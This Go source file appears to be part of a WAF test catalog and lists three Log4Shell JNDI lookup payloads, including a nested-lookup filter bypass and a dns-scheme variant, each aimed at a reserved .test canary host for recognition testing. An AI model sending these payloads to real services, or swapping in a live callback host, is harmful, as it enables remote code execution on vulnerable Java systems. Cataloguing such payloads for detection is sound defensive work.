package wafcatalog

// JNDI lookup injection (Log4Shell family, CVE-2021-44228 and its bypass forms).
//
// CATALOG ENTRIES ONLY. These vectors describe request shapes for a WAF to recognise. They do not run anything: there is
// no prober, no callback listener and no execution path in this package. Live use is gated by the cvecatalog lab gate
// and is deferred. Each payload calls back to log4j-canary.lab.test, a reserved name that cannot resolve to a real
// host, so a payload that somehow reached a Log4j-vulnerable service could only make a lookup for a name nobody owns.
// jndi_test.go enforces the reserved-host rule for every payload in this family.

const jndiCanaryHost = "log4j-canary.lab.test"

func jndiInjectionVectors() ([]AttackVector, error) {
	const src = "catalog-only; public advisory CVE-2021-44228 and its documented lookup-obfuscation bypasses; payload host is a reserved .test name; no prober exists (see cvecatalog lab gate)"
	const wstg = "WSTG-INPV-11"
	const pre = "target runs a Java service that logs attacker-controlled input through a vulnerable Log4j 2 version"
	return buildDepth(FamilyJNDIInjection, "CWE-917", []depthSpec{
		{id: "JNDI-001", name: "Log4Shell JNDI lookup in the User-Agent header", severity: SeverityCritical,
			preconditions: pre + ", logging request headers",
			method:        "GET", path: "/login", location: "header:User-Agent", payload: "${jndi:ldap://" + jndiCanaryHost + "/a}", attack: "JNDI lookup expression in a header that a logging call expands, the original Log4Shell request shape",
			benignPayload: "Mozilla/5.0 (X11; Linux x86_64)", benignDescription: "ordinary browser User-Agent string", wstg: wstg, top10: top10Injection, source: src, platform: PlatformAny},
		{id: "JNDI-002", name: "Nested-default lookup obfuscation (${lower:} bypass) in a search query", severity: SeverityCritical,
			preconditions: pre + ", with a search query that is logged, behind a filter that matches the literal string jndi",
			method:        "GET", path: "/search", location: "query:q", payload: "${${lower:j}ndi:${lower:l}dap://" + jndiCanaryHost + "/b}", attack: "lookup whose keyword is built from nested lower-case lookups, so a literal match for jndi never appears in the request",
			benignPayload: "laptop stand", benignDescription: "ordinary search term", wstg: wstg, top10: top10Injection, source: src, platform: PlatformAny},
		{id: "JNDI-003", name: "DNS-protocol JNDI lookup in a login username", severity: SeverityHigh,
			preconditions: pre + ", with a login form whose username is logged",
			method:        "POST", path: "/login", location: "body:json:username", payload: "${jndi:dns://" + jndiCanaryHost + "/c}", attack: "lookup using the dns protocol rather than ldap, for filters that only block ldap and rmi schemes",
			benignPayload: "jane.doe", benignDescription: "ordinary login username", wstg: wstg, top10: top10Injection, source: src, platform: PlatformAny},
	})
}
